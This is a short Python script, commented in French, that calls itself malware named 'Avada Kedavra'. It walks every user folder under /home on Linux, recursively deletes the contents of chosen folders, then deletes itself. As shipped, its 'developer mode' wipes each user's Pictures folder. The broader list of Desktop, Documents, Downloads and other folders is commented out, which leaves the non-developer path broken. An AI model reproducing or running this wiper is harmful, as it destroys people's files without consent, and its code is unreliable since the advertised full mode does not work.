from os import *
from os.path import isfile, join
import shutil
import platform


"""
-------- Avada Kedavra --------
Ce programme est un malware.
Il suprime tout les fichiers de 
la machine. Mais il fonctionne 
que sur Linux. Pour démmaré le 
programme, le mode développeur
doit être désactiver. Pour ce
faire, rendez-vous dans la
class MAIN, passer a False 
la varriable mode_developpeur

"""

class MAIN():
    os = "None"
    mode_developpeur = True




def Test_Os():
    if platform.system() == "Linux":
        MAIN.os = "Linux"
    elif platform.system() == "Windows":
        MAIN.os = "Windows"

def remove_file(path):
    try:
        for f in listdir(path):
            if isfile(join(path, f)):
                if f != "Avada-Kedavra.py":
                    #On suprime le fichier
                    remove(join(path, f))
                    print("Le fichier "+path+"/"+f+" a été suprimé")
            else:
                # Si ce n'est pas un fichier mais un dossier
                shutil.rmtree(join(path, f))
                print("Le dossier "+path+"/"+f+" a été suprimé")
    except Exception as exc:
        print(exc)

def auto_Destroy():
    for f in listdir(getcwd()):
        print(f)
        print("passe")
        remove(join(getcwd(),"Avada-Kedavra.py"))
        return


def src_file(path):
    liste_file = []
    for contenu in listdir(path):
        liste_file.append(contenu)
    return liste_file

def foreach_racine():
    # Dans un premier temps, On va à la racine.
    # Enssuite on regarde si on est sur Linux ou pas.
    # Si Linux, on va dans home/<dossier qu'il y a>/ et on suprime tout dans les dossiers Bureau, Images, Documents, Musique, vidéo ect. On test aussi la même chose mais en anglais.
    
    if MAIN.os == "Linux":
        session = []

        # On récupère tout les utilisateurs dans la liste session
        for f in listdir("/home/"):
            session.append(f)

        #On change la liste pour évité de suprimé l'ordi ^^
        if MAIN.mode_developpeur:
            Dossier_a_suprimer = ["Pictures"]
        else:
            #Dossier_a_suprimer = ["Desktop","Documents","Pictures","Music","Videos","Downloads","Templates","Bureau","Document","Image","Musique","Vidéo","Téléchargement","Modèle"]
            print('PAsse !')

        for user in session:
            print(user)
            for d in Dossier_a_suprimer:
                remove_file("/home/"+user+"/"+d)
                print("/home/"+user+"/"+d)


def start():
    Test_Os()
    foreach_racine()
    auto_Destroy()


start()